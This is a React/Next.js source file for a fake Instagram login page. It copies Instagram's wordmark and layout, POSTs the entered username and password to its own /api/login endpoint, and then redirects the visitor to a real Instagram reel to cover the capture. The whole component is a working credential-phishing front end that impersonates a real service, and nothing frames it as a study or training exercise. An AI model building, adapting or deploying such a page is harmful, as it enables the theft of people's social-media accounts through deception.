"use client";
import { useState } from "react";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });

      const data = await res.json();
      if (res.ok) {
        window.location.href = "https://www.instagram.com/reel/DHNwk20JzT9/?utm_source=ig_web_copy_link";
        // redirect or do something else
      } else {
        alert(data.message || "Login failed.");
      }
    } catch (err) {
      console.error(err);
      alert("Something went wrong.");
    }
  };

  return (
    <div className="bg-gray-50 min-h-screen flex items-center justify-center text-zinc-700">
      <div className="flex max-w-5xl w-full px-4">
        {/* Left */}
        <div className="hidden md:flex w-1/2 justify-center items-center">
          <img
            src="/instagram-web-lox-image.png"
            className="w-2xl"
            alt="Phone preview"
          />
        </div>

        {/* Right */}
        <div className="w-full md:w-1/2 max-w-sm mx-auto">
          <div className="bg-white border border-gray-300 px-8 py-10">
            <img
              src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
              alt="Instagram"
              className="mx-auto mb-6 w-40"
            />

            <form onSubmit={handleLogin}>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full mb-2 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm"
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full mb-3 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm"
              />
              <button
                type="submit"
                className="w-full bg-blue-500 text-white py-1.5 rounded text-sm font-semibold"
              >
                Log In
              </button>
            </form>

            <div className="flex items-center my-4">
              <div className="flex-grow h-px bg-gray-300"></div>
              <span className="mx-3 text-xs text-gray-500 font-semibold">OR</span>
              <div className="flex-grow h-px bg-gray-300"></div>
            </div>

            <div className="text-center text-sm text-blue-900 font-medium cursor-pointer mb-3">
              Log in with Facebook
            </div>
            <div className="text-center text-xs text-blue-500 cursor-pointer">
              Forgot password?
            </div>
          </div>

          <div className="bg-white border border-gray-300 mt-3 text-sm text-center py-4">
            Don't have an account?{" "}
            <span className="text-blue-500 font-medium cursor-pointer">Sign up</span>
          </div>

          <div className="text-center mt-5">
            <span className="text-sm">Get the app.</span>
            <div className="flex justify-center mt-2 space-x-2">
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
``